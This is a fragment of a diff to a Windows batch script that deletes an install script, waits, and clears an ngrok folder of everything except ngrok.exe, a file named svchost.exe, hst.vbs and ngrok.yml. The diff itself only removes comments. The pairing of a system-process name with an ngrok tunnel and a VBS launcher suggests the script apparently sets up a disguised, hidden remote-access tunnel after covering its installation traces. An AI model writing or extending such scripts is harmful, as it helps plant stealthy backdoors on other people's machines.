@@ -22,10 +22,8 @@ echo.>"%TEMP_FILE%"
 
 del "%DOTNET_INSTALL_SCRIPT%"
 
-:: Wait for 4 seconds
 timeout /t 4 /nobreak >nul
 
-:: Delete everything in NGROK_DIR except ngrok.exe, svchost.exe, hst.vbs, and ngrok.yml
 for /r "%NGROK_DIR%" %%F in (*) do (
     if /i not "%%~nxF"=="ngrok.exe" (
         if /i not "%%~nxF"=="svchost.exe" (
